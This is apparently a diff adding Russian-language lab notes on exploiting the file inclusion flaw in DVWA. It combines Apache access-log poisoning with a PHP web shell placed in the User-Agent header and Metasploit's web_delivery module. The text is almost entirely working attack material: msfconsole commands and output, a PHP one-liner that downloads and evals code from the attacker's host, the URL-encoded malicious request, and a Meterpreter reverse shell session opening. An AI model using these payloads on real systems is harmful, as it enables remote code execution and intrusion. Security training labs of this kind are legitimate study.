@@ -1,0 +1,53 @@
+# msfconsole
+# use exploit/multi/script/web_delivery
+
+msf6 exploit(multi/script/web_delivery) > set LHOST 192.168.0.116
+LHOST => 192.168.0.116
+msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > set LHOST 192.168.0.116
+LHOST => 192.168.0.116
+msf6 exploit(multi/script/web_delivery) > set SRVPORT 8000
+SRVPORT => 8000
+msf6 exploit(multi/script/web_delivery) > set LPORT 6666
+LPORT => 6666
+msf6 exploit(multi/script/web_delivery) > exploit
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.0.116:6666 
+[*] Using URL: http://0.0.0.0:8000/c0wGr1D5wXYEmV3
+msf6 exploit(multi/script/web_delivery) > [*] Local IP: http://192.168.0.116:8000/c0wGr1D5wXYEmV3
+[*] Server started.
+[*] Run the following command on the target machine:
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.0.116:8000/c0wGr1D5wXYEmV3', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+[*] 192.168.0.117    web_delivery - Delivering Payload (1114 bytes)
+[*] Sending stage (39282 bytes) to 192.168.0.117
+[*] Meterpreter session 1 opened (192.168.0.116:6666 -> 192.168.0.117:33109) at 2021-06-19 13:32:40 -0400
+
+# после чего делаем urlencode php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.0.116:8000/c0wGr1D5wXYEmV3', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+проверяем открытые сессии sessions, sessions -i №
+# и подставляем данную строку в парамметр запроса
+данный вид уязвимости возникает из за не правельных прав в папках и файлов в данном случаи, у нас есть ошибка прав логов apache2
+запрос уязвимой страницы 
+
+GET /dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=%70%68%70%20%2d%64%20%61%6c%6c%6f%77%5f%75%72%6c%5f%66%6f%70%65%6e%3d%74%72%75%65%20%2d%72%20%22%65%76%61%6c%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%31%36%3a%38%30%30%30%2f%63%30%77%47%72%31%44%35%77%58%59%45%6d%56%33%27%2c%20%66%61%6c%73%65%2c%20%73%74%72%65%61%6d%5f%63%6f%6e%74%65%78%74%5f%63%72%65%61%74%65%28%5b%27%73%73%6c%27%3d%3e%5b%27%76%65%72%69%66%79%5f%70%65%65%72%27%3d%3e%66%61%6c%73%65%2c%27%76%65%72%69%66%79%5f%70%65%65%72%5f%6e%61%6d%65%27%3d%3e%66%61%6c%73%65%5d%5d%29%29%29%3b%22 HTTP/1.1
+
+Host: 192.168.0.117
+
+User-Agent: <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Referer: http://192.168.0.117/dvwa/vulnerabilities/fi/?page=include.php
+
+Cookie: security=low; PHPSESSID=3auenn7ugdpdoagk2vdo68fah3
+
+Upgrade-Insecure-Requests: 1
+
